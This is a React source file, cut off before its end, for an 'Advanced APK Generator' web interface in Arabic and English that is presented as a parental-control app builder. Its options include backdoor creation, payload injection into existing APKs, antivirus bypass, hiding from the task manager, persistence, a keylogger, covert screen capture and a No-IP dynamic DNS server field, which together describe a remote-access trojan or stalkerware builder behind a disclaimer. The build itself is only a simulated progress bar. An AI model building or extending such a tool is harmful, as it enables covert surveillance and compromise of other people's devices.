import React, { useState } from 'react';
import { 
  Download, 
  Settings, 
  Shield, 
  Clock, 
  Filter, 
  MapPin, 
  Smartphone,
  CheckCircle,
  AlertCircle,
  Play,
  Monitor,
  FolderOpen,
  Network,
  Server,
  Eye,
  Wifi,
  Database,
  Lock,
  Syringe,
  Code,
  FileCode,
  Zap,
  Globe,
  Languages
} from 'lucide-react';

const APKGenerator: React.FC = () => {
  const [isGenerating, setIsGenerating] = useState(false);
  const [progress, setProgress] = useState(0);
  const [selectedFeatures, setSelectedFeatures] = useState<string[]>([
    'content-filter',
    'time-control',
    'app-blocking',
    'screen-monitoring'
  ]);
  const [activeConfigTab, setActiveConfigTab] = useState('basic');
  const [selectedLanguage, setSelectedLanguage] = useState('ar');

  const features = [
    {
      id: 'content-filter',
      name: 'Content Filtering',
      nameAr: 'تصفية المحتوى',
      description: 'Block inappropriate websites and content',
      descriptionAr: 'حظر المواقع والمحتوى غير المناسب',
      icon: Filter,
      color: 'from-red-500 to-pink-500'
    },
    {
      id: 'time-control',
      name: 'Time Management',
      nameAr: 'إدارة الوقت',
      description: 'Set screen time limits and schedules',
      descriptionAr: 'تحديد حدود وقت الشاشة والجداول الزمنية',
      icon: Clock,
      color: 'from-blue-500 to-cyan-500'
    },
    {
      id: 'app-blocking',
      name: 'App Control',
      nameAr: 'التحكم في التطبيقات',
      description: 'Block or allow specific applications',
      descriptionAr: 'حظر أو السماح بتطبيقات محددة',
      icon: Shield,
      color: 'from-purple-500 to-indigo-500'
    },
    {
      id: 'location-tracking',
      name: 'Location Tracking',
      nameAr: 'تتبع الموقع',
      description: 'Monitor device location and set geofences',
      descriptionAr: 'مراقبة موقع الجهاز وتحديد الحدود الجغرافية',
      icon: MapPin,
      color: 'from-emerald-500 to-teal-500'
    },
    {
      id: 'device-info',
      name: 'Device Monitoring',
      nameAr: 'مراقبة الجهاز',
      description: 'Track device usage and performance',
      descriptionAr: 'تتبع استخدام الجهاز والأداء',
      icon: Smartphone,
      color: 'from-orange-500 to-red-500'
    },
    {
      id: 'screen-monitoring',
      name: 'Screen Monitoring',
      nameAr: 'مراقبة الشاشة',
      description: 'Real-time screen capture and monitoring',
      descriptionAr: 'التقاط الشاشة والمراقبة في الوقت الفعلي',
      icon: Monitor,
      color: 'from-violet-500 to-purple-500'
    },
    {
      id: 'file-explorer',
      name: 'File Explorer',
      nameAr: 'مستكشف الملفات',
      description: 'Browse and monitor device files',
      descriptionAr: 'تصفح ومراقبة ملفات الجهاز',
      icon: FolderOpen,
      color: 'from-amber-500 to-orange-500'
    },
    {
      id: 'network-monitor',
      name: 'Network Monitoring',
      nameAr: 'مراقبة الشبكة',
      description: 'Monitor network traffic and connections',
      descriptionAr: 'مراقبة حركة الشبكة والاتصالات',
      icon: Network,
      color: 'from-cyan-500 to-blue-500'
    },
    {
      id: 'apk-injection',
      name: 'APK Injection',
      nameAr: 'حقن APK',
      description: 'Inject code into existing APK files',
      descriptionAr: 'حقن الكود في ملفات APK الموجودة',
      icon: Syringe,
      color: 'from-rose-500 to-red-500'
    }
  ];

  const configTabs = [
    { id: 'basic', label: 'Basic Config', labelAr: 'الإعدادات الأساسية', icon: Settings },
    { id: 'network', label: 'Network & Server', labelAr: 'الشبكة والخادم', icon: Server },
    { id: 'injection', label: 'APK Injection', labelAr: 'حقن APK', icon: Syringe },
    { id: 'advanced', label: 'Advanced Options', labelAr: 'الخيارات المتقدمة', icon: Lock },
  ];

  const injectionMethods = [
    {
      id: 'payload-injection',
      name: 'Payload Injection',
      nameAr: 'حقن الحمولة',
      description: 'Inject custom payload into APK',
      descriptionAr: 'حقن حمولة مخصصة في APK',
      icon: Code,
      risk: 'high'
    },
    {
      id: 'backdoor-injection',
      name: 'Backdoor Creation',
      nameAr: 'إنشاء باب خلفي',
      description: 'Create backdoor access in target APK',
      descriptionAr: 'إنشاء وصول خلفي في APK المستهدف',
      icon: Lock,
      risk: 'critical'
    },
    {
      id: 'permission-escalation',
      name: 'Permission Escalation',
      nameAr: 'تصعيد الصلاحيات',
      description: 'Add elevated permissions to APK',
      descriptionAr: 'إضافة صلاحيات مرتفعة إلى APK',
      icon: Shield,
      risk: 'medium'
    },
    {
      id: 'stealth-mode',
      name: 'Stealth Mode',
      nameAr: 'الوضع الخفي',
      description: 'Hide injection from detection',
      descriptionAr: 'إخفاء الحقن من الكشف',
      icon: Eye,
      risk: 'high'
    }
  ];

  const languages = [
    { code: 'ar', name: 'العربية', flag: '🇸🇦' },
    { code: 'en', name: 'English', flag: '🇺🇸' },
    { code: 'fr', name: 'Français', flag: '🇫🇷' },
    { code: 'es', name: 'Español', flag: '🇪🇸' },
    { code: 'de', name: 'Deutsch', flag: '🇩🇪' },
    { code: 'ru', name: 'Русский', flag: '🇷🇺' },
    { code: 'zh', name: '中文', flag: '🇨🇳' },
    { code: 'ja', name: '日本語', flag: '🇯🇵' }
  ];

  const handleFeatureToggle = (featureId: string) => {
    setSelectedFeatures(prev => 
      prev.includes(featureId) 
        ? prev.filter(id => id !== featureId)
        : [...prev, featureId]
    );
  };

  const handleGenerate = () => {
    setIsGenerating(true);
    setProgress(0);
    
    const interval = setInterval(() => {
      setProgress(prev => {
        if (prev >= 100) {
          clearInterval(interval);
          setIsGenerating(false);
          return 100;
        }
        return prev + 6;
      });
    }, 400);
  };

  const getRiskColor = (risk: string) => {
    switch (risk) {
      case 'low': return 'text-emerald-400 bg-emerald-500/20';
      case 'medium': return 'text-yellow-400 bg-yellow-500/20';
      case 'high': return 'text-orange-400 bg-orange-500/20';
      case 'critical': return 'text-red-400 bg-red-500/20';
      default: return 'text-slate-400 bg-slate-500/20';
    }
  };

  const isArabic = selectedLanguage === 'ar';

  return (
    <div className="space-y-6" dir={isArabic ? 'rtl' : 'ltr'}>
      <div className="flex items-center justify-between">
        <div>
          <h2 className="text-3xl font-bold text-white mb-2">
            {isArabic ? 'مولد APK المتقدم' : 'Advanced APK Generator'}
          </h2>
          <p className="text-slate-400">
            {isArabic 
              ? 'إنشاء تطبيقات الرقابة الأبوية المخصصة مع خيارات الحقن المتقدمة'
              : 'Create custom parental control applications with advanced injection options'
            }
          </p>
        </div>
        <div className="flex items-center space-x-3">
          <div className="flex items-center space-x-2">
            <Languages className="w-5 h-5 text-slate-400" />
            <select 
              value={selectedLanguage}
              onChange={(e) => setSelectedLanguage(e.target.value)}
              className="px-3 py-2 bg-slate-700 border border-slate-600 rounded-lg text-white focus:outline-none focus:ring-2 focus:ring-blue-500"
            >
              {languages.map((lang) => (
                <option key={lang.code} value={lang.code}>
                  {lang.flag} {lang.name}
                </option>
              ))}
            </select>
          </div>
        </div>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        <div className="lg:col-span-2 space-y-6">
          <div className="bg-slate-800/50 backdrop-blur-sm border border-slate-700/50 rounded-xl p-6">
            <div className="flex items-center space-x-1 mb-6 overflow-x-auto">
              {configTabs.map((tab) => {
                const Icon = tab.icon;
                return (
                  <button
                    key={tab.id}
                    onClick={() => setActiveConfigTab(tab.id)}
                    className={`px-4 py-2 rounded-lg transition-all duration-200 flex items-center space-x-2 whitespace-nowrap ${
                      activeConfigTab === tab.id
                        ? 'bg-blue-500 text-white'
                        : 'text-slate-400 hover:text-white hover:bg-slate-700/50'
                    }`}
                  >
                    <Icon className="w-4 h-4" />
                    <span className="text-sm font-medium">
                      {isArabic ? tab.labelAr : tab.label}
                    </span>
                  </button>
                );
              })}
            </div>

            {activeConfigTab === 'basic' && (
              <div className="space-y-4">
                <h3 className="text-xl font-bold text-white mb-4 flex items-center">
                  <Settings className="w-5 h-5 mr-2" />
                  {isArabic ? 'الإعدادات الأساسية' : 'Basic Configuration'}
                </h3>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div>
                    <label className="block text-sm font-medium text-slate-300 mb-2">
                      {isArabic ? 'اسم التطبيق' : 'App Name'}
                    </label>
                    <input 
                      type="text" 
                      className="w-full px-4 py-3 bg-slate-700/50 border border-slate-600 rounded-lg text-white placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                      placeholder={isArabic ? 'حارس العائلة المحترف' : 'FamilyGuard Pro'}
                      defaultValue={isArabic ? 'حارس العائلة المحترف' : 'FamilyGuard Pro'}
                    />
                  </div>
                  <div>
                    <label className="block text-sm font-medium text-slate-300 mb-2">
                      {isArabic ? 'الإصدار' : 'Version'}
                    </label>
                    <input 
                      type="text" 
                      className="w-full px-4 py-3 bg-slate-700/50 border border-slate-600 rounded-lg text-white placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                      placeholder="2.1.0"
                      defaultValue="2.1.0"
                    />
                  </div>
                </div>
                
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div>
                    <label className="block text-sm font-medium text-slate-300 mb-2">
                      {isArabic ? 'اسم الحزمة' : 'Package Name'}
                    </label>
                    <input 
                      type="text" 
                      className="w-full px-4 py-3 bg-slate-700/50 border border-slate-600 rounded-lg text-white placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                      placeholder="com.parentguard.pro"
                      defaultValue="com.parentguard.pro"
                    />
                  </div>
                  <div>
                    <label className="block text-sm font-medium text-slate-300 mb-2">
                      {isArabic ? 'بريد المدير' : 'Admin Email'}
                    </label>
                    <input 
                      type="email" 
                      className="w-full px-4 py-3 bg-slate-700/50 border border-slate-600 rounded-lg text-white placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                      placeholder="admin@example.com"
                    />
                  </div>
                </div>
              </div>
            )}

            {activeConfigTab === 'network' && (
              <div className="space-y-4">
                <h3 className="text-xl font-bold text-white mb-4 flex items-center">
                  <Server className="w-5 h-5 mr-2" />
                  {isArabic ? 'إعدادات الشبكة والخادم' : 'Network & Server Configuration'}
                </h3>
                
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div>
                    <label className="block text-sm font-medium text-slate-300 mb-2">
                      {isArabic ? 'رابط الخادم' : 'Server URL'}
                    </label>
                    <input 
                      type="url" 
                      className="w-full px-4 py-3 bg-slate-700/50 border border-slate-600 rounded-lg text-white placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                      placeholder="https://api.parentguard.com"
                    />
                  </div>
                  <div>
                    <label className="block text-sm font-medium text-slate-300 mb-2">
                      {isArabic ? 'المنفذ' : 'Port'}
                    </label>
                    <input 
                      type="number" 
                      className="w-full px-4 py-3 bg-slate-700/50 border border-slate-600 rounded-lg text-white placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                      placeholder="8080"
                      defaultValue="8443"
                    />
                  </div>
                </div>

                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div>
                    <label className="block text-sm font-medium text-slate-300 mb-2">
                      {isArabic ? 'اسم مضيف No-IP' : 'No-IP Hostname'}
                    </label>
                    <input 
                      type="text" 
                      className="w-full px-4 py-3 bg-slate-700/50 border border-slate-600 rounded-lg text-white placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                      placeholder="myserver.ddns.net"
                    />
                  </div>
                  <div>
                    <label className="block text-sm font-medium text-slate-300 mb-2">
                      {isArabic ? 'الخادم الاحتياطي' : 'Backup Server'}
                    </label>
                    <input 
                      type="url" 
                      className="w-full px-4 py-3 bg-slate-700/50 border border-slate-600 rounded-lg text-white placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                      placeholder="https://backup.parentguard.com"
                    />
                  </div>
                </div>

                <div className="bg-slate-700/30 rounded-lg p-4">
                  <h4 className="text-white font-medium mb-3 flex items-center">
                    <Wifi className="w-4 h-4 mr-2" />
                    {isArabic ? 'إعدادات الاتصال' : 'Connection Settings'}
                  </h4>
                  <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                    <div>
                      <label className="block text-sm font-medium text-slate-300 mb-2">
                        {isArabic ? 'المهلة الزمنية (ثانية)' : 'Timeout (seconds)'}
                      </label>
                      <input 
                        type="number" 
                        className="w-full px-3 py-2 bg-slate-700 border border-slate-600 rounded-lg text-white placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-blue-500"
                        defaultValue="30"
                      />
                    </div>
                    <div>
                      <label className="block text-sm font-medium text-slate-300 mb-2">
                        {isArabic ? 'محاولات الإعادة' : 'Retry Attempts'}
                      </label>
                      <input 
                        type="number" 
                        className="w-full px-3 py-2 bg-slate-700 border border-slate-600 rounded-lg text-white placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-blue-500"
                        defaultValue="3"
                      />
                    </div>
                    <div>
                      <label className="block text-sm font-medium text-slate-300 mb-2">
                        {isArabic ? 'فترة المزامنة (دقيقة)' : 'Sync Interval (min)'}
                      </label>
                      <input 
                        type="number" 
                        className="w-full px-3 py-2 bg-slate-700 border border-slate-600 rounded-lg text-white placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-blue-500"
                        defaultValue="5"
                      />
                    </div>
                  </div>
                </div>
              </div>
            )}

            {activeConfigTab === 'injection' && (
              <div className="space-y-4">
                <h3 className="text-xl font-bold text-white mb-4 flex items-center">
                  <Syringe className="w-5 h-5 mr-2" />
                  {isArabic ? 'خيارات حقن APK' : 'APK Injection Options'}
                </h3>
                
                <div className="bg-red-500/10 border border-red-500/30 rounded-lg p-4 mb-6">
                  <div className="flex items-center space-x-2 mb-2">
                    <AlertCircle className="w-5 h-5 text-red-400" />
                    <h4 className="text-red-400 font-medium">
                      {isArabic ? 'تحذير أمني' : 'Security Warning'}
                    </h4>
                  </div>
                  <p className="text-red-300 text-sm">
                    {isArabic 
                      ? 'هذه الميزات مخصصة للاختبار الأمني والاستخدام التعليمي فقط. استخدمها بمسؤولية وفقط على الأجهزة التي تملكها.'
                      : 'These features are for security testing and educational purposes only. Use responsibly and only on devices you own.'
                    }
                  </p>
                </div>

                <div>
                  <label className="block text-sm font-medium text-slate-300 mb-2">
                    {isArabic ? 'ملف APK المستهدف' : 'Target APK File'}
                  </label>
                  <div className="flex items-center space-x-3">
                    <input 
                      type="file" 
                      accept=".apk"
                      className="hidden"
                      id="apk-file"
                    />
                    <label 
                      htmlFor="apk-file"
                      className="flex-1 px-4 py-3 bg-slate-700/50 border border-slate-600 rounded-lg text-slate-400 cursor-pointer hover:bg-slate-700/70 transition-colors flex items-center space-x-2"
                    >
                      <FileCode className="w-4 h-4" />
                      <span>{isArabic ? 'اختر ملف APK للحقن' : 'Choose APK file to inject'}</span>
                    </label>
                  </div>
                </div>

                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  {injectionMethods.map((method) => {
                    const Icon = method.icon;
                    return (
                      <div
                        key={method.id}
                        className="p-4 bg-slate-700/30 border border-slate-600 rounded-lg hover:bg-slate-700/50 transition-colors cursor-pointer"
                      >
                        <div className="flex items-start justify-between mb-3">
                          <div className="flex items-center space-x-3">
                            <div className="p-2 bg-gradient-to-br from-red-500 to-pink-500 rounded-lg">
                              <Icon className="w-4 h-4 text-white" />
                            </div>
                            <div>
                              <h4 className="text-white font-medium">
                                {isArabic ? method.nameAr : method.name}
                              </h4>
                              <p className="text-slate-400 text-sm">
                                {isArabic ? method.descriptionAr : method.description}
                              </p>
                            </div>
                          </div>
                          <span className={`px-2 py-1 rounded-full text-xs font-medium ${getRiskColor(method.risk)}`}>
                            {method.risk.toUpperCase()}
                          </span>
                        </div>
                        <label className="flex items-center space-x-2">
                          <input 
                            type="checkbox" 
                            className="w-4 h-4 text-red-500 bg-slate-700 border-slate-600 rounded focus:ring-red-500"
                          />
                          <span className="text-slate-300 text-sm">
                            {isArabic ? 'تفعيل هذه الطريقة' : 'Enable this method'}
                          </span>
                        </label>
                      </div>
                    );
                  })}
                </div>

                <div className="bg-slate-700/30 rounded-lg p-4">
                  <h4 className="text-white font-medium mb-3 flex items-center">
                    <Zap className="w-4 h-4 mr-2" />
                    {isArabic ? 'إعدادات الحقن المتقدمة' : 'Advanced Injection Settings'}
                  </h4>
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <div>
                      <label className="block text-sm font-medium text-slate-300 mb-2">
                        {isArabic ? 'نوع التشفير' : 'Encryption Type'}
                      </label>
                      <select className="w-full px-3 py-2 bg-slate-700 border border-slate-600 rounded-lg text-white focus:outline-none focus:ring-2 focus:ring-red-500">
                        <option value="aes256">AES-256</option>
                        <option value="rsa2048">RSA-2048</option>
                        <option value="custom">Custom</option>
                      </select>
                    </div>
                    <div>
                      <label className="block text-sm font-medium text-slate-300 mb-2">
                        {isArabic ? 'طريقة التخفي' : 'Obfuscation Method'}
                      </label>
                      <select className="w-full px-3 py-2 bg-slate-700 border border-slate-600 rounded-lg text-white focus:outline-none focus:ring-2 focus:ring-red-500">
                        <option value="basic">Basic</option>
                        <option value="advanced">Advanced</option>
                        <option value="military">Military Grade</option>
                      </select>
                    </div>
                  </div>
                  
                  <div className="mt-4 space-y-3">
                    <label className="flex items-center space-x-3">
                      <input type="checkbox" className="w-4 h-4 text-red-500 bg-slate-700 border-slate-600 rounded focus:ring-red-500" />
                      <span className="text-slate-300">
                        {isArabic ? 'تجاوز الحماية المضادة للفيروسات' : 'Bypass antivirus protection'}
                      </span>
                    </label>
                    <label className="flex items-center space-x-3">
                      <input type="checkbox" className="w-4 h-4 text-red-500 bg-slate-700 border-slate-600 rounded focus:ring-red-500" />
                      <span className="text-slate-300">
                        {isArabic ? 'إخفاء من مدير المهام' : 'Hide from task manager'}
                      </span>
                    </label>
                    <label className="flex items-center space-x-3">
                      <input type="checkbox" className="w-4 h-4 text-red-500 bg-slate-700 border-slate-600 rounded focus:ring-red-500" />
                      <span className="text-slate-300">
                        {isArabic ? 'تفعيل الاستمرارية' : 'Enable persistence'}
                      </span>
                    </label>
                  </div>
                </div>
              </div>
            )}

            {activeConfigTab === 'advanced' && (
              <div className="space-y-4">
                <h3 className="text-xl font-bold text-white mb-4 flex items-center">
                  <Lock className="w-5 h-5 mr-2" />
                  {isArabic ? 'الخيارات المتقدمة' : 'Advanced Options'}
                </h3>
                
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div>
                    <label className="block text-sm font-medium text-slate-300 mb-2">
                      {isArabic ? 'إصدار SDK المستهدف' : 'Target SDK Version'}
                    </label>
                    <select className="w-full px-4 py-3 bg-slate-700/50 border border-slate-600 rounded-lg text-white focus:outline-none focus:ring-2 focus:ring-blue-500">
                      <option value="35">API 35 (Android 15)</option>
                      <option value="34">API 34 (Android 14)</option>
                      <option value="33">API 33 (Android 13)</option>
                      <option value="32">API 32 (Android 12L)</option>
                    </select>
                  </div>
                  <div>
                    <label className="block text-sm font-medium text-slate-300 mb-2">
                      {isArabic ? 'الحد الأدنى لإصدار SDK' : 'Min SDK Version'}
                    </label>
                    <select className="w-full px-4 py-3 bg-slate-700/50 border border-slate-600 rounded-lg text-white focus:outline-none focus:ring-2 focus:ring-blue-500">
                      <option value="21">API 21 (Android 5.0)</option>
                      <option value="23">API 23 (Android 6.0)</option>
                      <option value="24">API 24 (Android 7.0)</option>
                      <option value="26">API 26 (Android 8.0)</option>
                    </select>
                  </div>
                </div>

                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div>
                    <label className="block text-sm font-medium text-slate-300 mb-2">
                      {isArabic ? 'المعمارية' : 'Architecture'}
                    </label>
                    <select className="w-full px-4 py-3 bg-slate-700/50 border border-slate-600 rounded-lg text-white focus:outline-none focus:ring-2 focus:ring-blue-500">
                      <option value="universal">{isArabic ? 'شامل (جميع المعماريات)' : 'Universal (All architectures)'}</option>
                      <option value="arm64-v8a">ARM64-v8a</option>
                      <option value="armeabi-v7a">ARMeabi-v7a</option>
                      <option value="x86_64">x86_64</option>
                    </select>
                  </div>
                  <div>
                    <label className="block text-sm font-medium text-slate-300 mb-2">
                      {isArabic ? 'نوع البناء' : 'Build Type'}
                    </label>
                    <select className="w-full px-4 py-3 bg-slate-700/50 border border-slate-600 rounded-lg text-white focus:outline-none focus:ring-2 focus:ring-blue-500">
                      <option value="release">{isArabic ? 'إصدار (محسن)' : 'Release (Optimized)'}</option>
                      <option value="debug">{isArabic ? 'تصحيح (تطوير)' : 'Debug (Development)'}</option>
                    </select>
                  </div>
                </div>

                <div className="bg-slate-700/30 rounded-lg p-4">
                  <h4 className="text-white font-medium mb-3 flex items-center">
                    <Eye className="w-4 h-4 mr-2" />
                    {isArabic ? 'خيارات المراقبة' : 'Monitoring Options'}
                  </h4>
                  <div className="space-y-3">
                    <label className="flex items-center space-x-3">
                      <input type="checkbox" className="w-4 h-4 text-blue-500 bg-slate-700 border-slate-600 rounded focus:ring-blue-500" defaultChecked />
                      <span className="text-slate-300">
                        {isArabic ? 'تفعيل مراقبة التقاط الشاشة' : 'Enable screen capture monitoring'}
                      </span>
                    </label>
                    <label className="flex items-center space-x-3">
                      <input type="checkbox" className="w-4 h-4 text-blue-500 bg-slate-700 border-slate-600 rounded focus:ring-blue-500" defaultChecked />
                      <span className="text-slate-300">
                        {isArabic ? 'السماح بالوصول إلى نظام الملفات' : 'Allow file system access'}
                      </span>
                    </label>
                    <label className="flex items-center space-x-3">
                      <input type="checkbox" className="w-4 h-4 text-blue-500 bg-slate-700 border-slate-600 rounded focus:ring-blue-500" />
                      <span className="text-slate-300">
                        {isArabic ? 'تفعيل وظيفة تسجيل المفاتيح' : 'Enable keylogger functionality'}
                      </span>
                    </label>
                    <label className="flex items-center space-x-3">
                      <input type="checkbox" className="w-4 h-4 text-blue-500 bg-slate-700 border-slate-600 rounded focus:ring-blue-500" defaultChecked />
                      <span className="text-slate-300">
                        {isArabic ? 'مراقبة حركة الشبكة' : 'Network traffic monitoring'}
                      </span>
                    </label>
                  </div>
                </div>

                <div className="bg-slate-700/30 rounded-lg p-4">
                  <h4 className="text-white font-medium mb-3 flex items-center">
                    <Database className="w-4 h-4 mr-2" />
                    {isArabic ? 'البيانات والتخزين' : 'Data & Storage'}
                  </h4>
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <div>
                      <label className="block text-sm font-medium text-slate-300 mb-2">
                        {isArabic ? 'الاحتفاظ بالبيانات (أيام)' : 'Data Retention (days)'}
                      </label>
                      <input 
                        type="number" 
                        className="w-full px-3 py-2 bg-slate-700 border border-slate-600 rounded-lg text-white placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-blue-500"
                        defaultValue="30"
                      />
                    </div>
                    <div>
                      <label className="block text-sm font-medium text-slate-300 mb-2">
                        {isArabic ? 'الحد الأقصى لحجم السجل (ميجابايت)' : 'Max Log Size (MB)'}
                      </label>
                      <input 
                        type="number" 
                        className="w-full px-3 py-2 bg-slate-700 border border-slate-600 rounded-lg text-white placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-blue-500"
                        defaultValue="100"
                      />
                    </div>
                  </div>
                </div>
              </div>
            )}
          </div>

          <div className="bg-slate-800/50 backdrop-blur-sm border border-slate-700/50 rounded-xl p-6">
            <h3 className="text-xl font-bold text-white mb-6">
              {isArabic ? 'اختيار الميزات' : 'Select Features'}
            </h3>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              {features.map((feature) => {
                const Icon = feature.icon;
                const isSelected = selectedFeatures.includes(feature.id);
                
                return (
                  <div
                    key={feature.id}
                    onClick={() => handleFeatureToggle(feature.id)}
                    className={`p-4 rounded-lg border-2 cursor-pointer transition-all duration-200 ${
                      isSelected
                        ? 'border-blue-500 bg-blue-500/10'
                        : 'border-slate-600 hover:border-slate-500 bg-slate-700/30'
                    }`}
                  >
                    <div className="flex items-start space-x-3">
                      <div className={`p-2 bg-gradient-to-br ${feature.color} rounded-lg flex-shrink-0`}>
                        <Icon className="w-5 h-5 text-white" />
                      </div>
                      <div className="flex-1">
                        <div className="flex items-center justify-between">
                          <h4 className="text-white font-medium">
                            {isArabic ? feature.nameAr : feature.name}
                          </h4>
                          {isSelected && <CheckCircle className="w-5 h-5 text-blue-500" />}
                        </div>
                        <p className="text-slate-400 text-sm mt-1">
                          {isArabic ? feature.descriptionAr : feature.description}
                        </p>
                      </div>
                    </div>
                  </div>
                );
              })}
            </div>
          </div>
        </div>

        <div className="space-y-6">
          <div className="bg-slate-800/50 backdrop-blur-sm border border-slate-700/50 rounded-xl p-6">
            <h3 className="text-xl font-bold text-white mb-6">
              {isArabic ? 'حالة البناء' : 'Build Status'}
            </h3>
            
            {!isGenerating && progress === 0 && (
              <div className="text-center">
                <div className="w-16 h-16 bg-slate-700 rounded-full flex items-center justify-center mx-auto mb-4">
                  <Download className="w-8 h-8 text-slate-400" />
                </div>
                <p className="text-slate-400 mb-4">
                  {isArabic ? 'جاهز لتوليد APK' : 'Ready to generate APK'}
                </p>
                <button
                  onClick={handleGenerate}
                  className="w-full px-6 py-3 bg-gradient-to-r from-blue-500 to-purple-600 text-white rounded-lg hover:from-blue-600 hover:to-purple-700 transition-all duration-200 flex items-center justify-center space-x-2"
                >
                  <Play className="w-5 h-5" />
                  <span>{isArabic ? 'توليد APK' : 'Generate APK'}</span>
                </button>
              </div>
            )}

            {isGenerating && (
              <div className="text-center">
                <div className="w-16 h-16 bg-blue-500 rounded-full flex items-center justify-center mx-auto mb-4 animate-pulse">
                  <Settings className="w-8 h-8 text-white animate-spin" />
                </div>
                <p className="text-white font-medium mb-2">
                  {isArabic ? 'جاري بناء APK...' : 'Building APK...'}
                </p>
                <div className="w-full bg-slate-700 rounded-full h-2 mb-4">
                  <div 
                    className="bg-gradient-to-r from-blue-500 to-purple-600 h-2 rounded-full transition-all duration-500"
                    style={{ width: `${progress}%` }}
                  ></div>
                </div>
                <p className="text-slate-400 text-sm">{progress}% {isArabic ? 'مكتمل' : 'Complete'}</p>
                {progress > 15 && progress < 35 && (
                  <p className="text-slate-500 text-xs mt-1">
                    {isArabic ? 'تجميع الميزات...' : 'Compiling features...'}
                  </p>
                )}
                {progress >= 35 && progress < 60 && (
                  <p className="text-slate-500 text-xs mt-1">
                    {isArabic ? 'حقن الكود...' : 'Injecting code...'}
                  </p>
                )}
                {progress >= 60 && progress < 80 && (
                  <p className="text-slate-500 text-xs mt-1">
                    {isArabic ? 'بناء الموارد...' : 'Building resources...'}
                  </p>
                )}
                {progress >= 80 && progress < 95 && (
                  <p className="text-slate-500 text-xs mt-1">
                    {isArabic ? 'توقيع APK...' : 'Signing APK...'}
                  </p>
                )}
                {progress >= 95 && (
                  <p className="text-slate-500 text-xs mt-1">
                    {isArabic ? 'اللمسة الأخيرة...' : 'Finalizing...'}
                  </p>
                )}
              </div>
            )}

            {!isGenerating && progress === 100 && (
              <div className="text-center">
                <div className="w-16 h-16 bg-emerald-500 rounded-full flex items-center justify-center mx-auto mb-4">
                  <CheckCircle className="w-8 h-8 text-white" />
                </div>
                <p className="text-emerald-400 font-medium mb-4">
                  {isArabic ? 'تم توليد APK بنجاح!' : 'APK Generated Successfully!'}
                </p>
                <button className="w-full px-6 py-3 bg-emerald-500 text-white rounded-lg hover:bg-emerald-600 transition-all duration-200 flex items-center justify-center space-x-2 mb-3">
                  <Download className="w-5 h-5" />
                  <span>{isArabic ? 'تحميل APK' : 'Download APK'}</span>
                </button>
                <button 
                  onClick={() => setProgress(0)}
                  className="w-full px-6 py-3 bg-slate-600 text-white rounded-lg hover:bg-slate-500 transition-all duration-200 text-sm"
                >
                  {isArabic ? 'توليد آخر' : 'Generate Another'}
                </button>
              </div>
            )}
          </div>

          <div className="bg-slate-800/50 backdrop-blur-sm border border-slate-700/50 rounded-xl p-6">
            <h3 className="text-lg font-bold text-white mb-4">
              {isArabic ? 'معلومات البناء' : 'Build Information'}
            </h3>
            <div className="space-y-3 text-sm">
              <div className="flex justify-between">
                <span className="text-slate-400">{isArabic ? 'SDK المستهدف:' : 'Target SDK:'}</span>
                <span className="text-white">API 35</span>
              </div>
              <div className="flex justify-between">
                <span className="text-slate-400">{isArabic ? 'الحد الأدنى SDK:' : 'Min SDK:'}</span>
                <span className="text-white">API 21</span>
              </div>
              <div className="flex justify-between">
                <span className="text-slate-400">{isArabic ? 'المعمارية:' : 'Architecture:'}</span>
                <span className="text-white">{isArabic ? 'شامل' : 'Universal'}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-slate-400">{isArabic ? 'الميزات:' : 'Features:'}</span>
                <span className="text-white">{selectedFeatures.length} {isArabic ? 'مختارة' : 'selected'}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-slate-400">{isArabic ? 'الحجم المقدر:' : 'Est. Size:'}</span>
                <span className="text-white">~{15 + selectedFeatures.length * 2} MB</span>
              </div>
              <div className="flex justify-between">
                <span className="text-slate-400">{isArabic ? 'نوع البناء:' : 'Build Type:'}</span>
                <span className="text-white">{isArabic ? 'إصدار' : 'Release'}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-slate-400">{isArabic ? 'اللغة:' : 'Language:'}</span>
                <span className="text-white">
                  {languages.find(lang => lang.code === selectedLanguage)?.name}
                </span>
              </div>
            </div>
          </div>

          <div className="bg-slate-800/50 backdrop-blur-sm border border-slate-700/50 rounded-xl p-6">
            <h3 className="text-lg font-bold text-white mb-4 flex items-center">
              <AlertCircle className="w-5 h-5 mr-2 text-yellow-400" />
              {isArabic ? 'إشعار أمني' : 'Security Notice'}
            </h3>
            <div className="space-y-2 text-sm text-slate-300">
              <p>• {isArabic ? 'مراقبة الشاشة تتطلب أذونات إمكانية الوصول' : 'Screen monitoring requires accessibility permissions'}</p>
              <p>• {isArabic ? 'الوصول للملفات يحتاج أذونات التخزين' : 'File access needs storage permissions'}</p>
              <p>• {isArabic ? 'مراقبة الشبكة تتطلب امتيازات المدير' : 'Network monitoring requires admin privileges'}</p>
